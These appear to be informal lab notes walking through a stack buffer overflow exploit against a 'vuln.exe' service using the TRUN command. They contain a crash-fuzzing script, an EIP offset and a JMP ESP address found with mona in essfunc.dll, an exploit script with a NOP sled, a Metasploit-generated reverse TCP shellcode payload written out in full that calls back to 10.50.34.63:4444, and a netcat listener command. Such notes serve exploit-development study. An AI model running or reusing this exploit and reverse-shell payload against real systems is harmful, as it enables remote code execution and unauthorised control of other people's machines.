```python
#!/usr/bin/python

import socket

buff = "TRUN /.:/ " 
buff +=  "A" * 50000
s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("192.168.65.10", 9999))
print s.recv(1024)
s.send(buff)
s.close()
```
Run vuln.exe in immunity
pul out the stuff from crash


EIP 41414141
DUBG -> Restart
EIP (64-Bit Instruction Pointer) 6F43376F 2002

Now in the program we run the 
!mona module
- this shows all the DLLs loading into the program once it is ran
!mona jmp -r esp -m "essfunc.dll"

from here you can loookup the vulnerable dll, and find out all the address locations the DLL. At each address these are the instructions jump ESP
-if you put the B's at one of these points it will jump to the stack point
0x625011af
-----------------------------------------------------------------------------------------------
```python
#!/usr/bin/python

import socket

buff = "TRUN /.:/ " 
buff +=  "A" * 2002
buff += "\xaf\x11\x50\x62"
buff += "\x90" * 10
#buff += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0A$
s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("192.168.65.10", 9999))
print s.recv(1024)
s.send(buff)
s.close()
```
```shell
- After complete open up msfconsole to begin creating your exploit payload vector
msf6 > search payload/windows/shell
msf6 > use payload/windows/shell_reverse_tcp
msf6 payload(windows/shell_reverse_tcp) > set LHOST 10.50.34.63
msf6 payload(windows/shell_reverse_tcp) > set LPORT 4444
msf6 payload(windows/shell_reverse_tcp) > generate -f python -b "\x00\X0A\x0D\x20"
# windows/shell_reverse_tcp - 351 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=10.50.34.63, LPORT=4444, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, CreateSession=true, 
# AutoVerifySession=true
buf =  b""
buf += b"\xd9\xe9\xba\xca\x84\x48\xb7\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\x9a"
buf += b"\x97\xaa\x42\xe6\x70\xa8\xad\x16\x81\xcd\x24\xf3"
buf += b"\xb0\xcd\x53\x70\xe2\xfd\x10\xd4\x0f\x75\x74\xcc"
buf += b"\x84\xfb\x51\xe3\x2d\xb1\x87\xca\xae\xea\xf4\x4d"
buf += b"\x2d\xf1\x28\xad\x0c\x3a\x3d\xac\x49\x27\xcc\xfc"
buf += b"\x02\x23\x63\x10\x26\x79\xb8\x9b\x74\x6f\xb8\x78"
buf += b"\xcc\x8e\xe9\x2f\x46\xc9\x29\xce\x8b\x61\x60\xc8"
buf += b"\xc8\x4c\x3a\x63\x3a\x3a\xbd\xa5\x72\xc3\x12\x88"
buf += b"\xba\x36\x6a\xcd\x7d\xa9\x19\x27\x7e\x54\x1a\xfc"
buf += b"\xfc\x82\xaf\xe6\xa7\x41\x17\xc2\x56\x85\xce\x81"
buf += b"\x55\x62\x84\xcd\x79\x75\x49\x66\x85\xfe\x6c\xa8"
buf += b"\x0f\x44\x4b\x6c\x4b\x1e\xf2\x35\x31\xf1\x0b\x25"
buf += b"\x9a\xae\xa9\x2e\x37\xba\xc3\x6d\x50\x0f\xee\x8d"
buf += b"\xa0\x07\x79\xfe\x92\x88\xd1\x68\x9f\x41\xfc\x6f"
buf += b"\xe0\x7b\xb8\xff\x1f\x84\xb9\xd6\xdb\xd0\xe9\x40"
buf += b"\xcd\x58\x62\x90\xf2\x8c\x25\xc0\x5c\x7f\x86\xb0"
buf += b"\x1c\x2f\x6e\xda\x92\x10\x8e\xe5\x78\x39\x25\x1c"
buf += b"\xeb\x4c\x88\x3c\xd4\x38\xee\x40\x3b\xe5\x67\xa6"
buf += b"\x51\x05\x2e\x71\xce\xbc\x6b\x09\x6f\x40\xa6\x74"
buf += b"\xaf\xca\x45\x89\x7e\x3b\x23\x99\x17\xcb\x7e\xc3"
buf += b"\xbe\xd4\x54\x6b\x5c\x46\x33\x6b\x2b\x7b\xec\x3c"
buf += b"\x7c\x4d\xe5\xa8\x90\xf4\x5f\xce\x68\x60\xa7\x4a"
buf += b"\xb7\x51\x26\x53\x3a\xed\x0c\x43\x82\xee\x08\x37"
buf += b"\x5a\xb9\xc6\xe1\x1c\x13\xa9\x5b\xf7\xc8\x63\x0b"
buf += b"\x8e\x22\xb4\x4d\x8f\x6e\x42\xb1\x3e\xc7\x13\xce"
buf += b"\x8f\x8f\x93\xb7\xed\x2f\x5b\x62\xb6\x40\x16\x2e"
buf += b"\x9f\xc8\xff\xbb\x9d\x94\xff\x16\xe1\xa0\x83\x92"
buf += b"\x9a\x56\x9b\xd7\x9f\x13\x1b\x04\xd2\x0c\xce\x2a"
buf += b"\x41\x2c\xdb"

# make sure your variable aren't jacked upp buff/buf
#open a netcat listener on linux
nc -lvnp 4444
#now run script

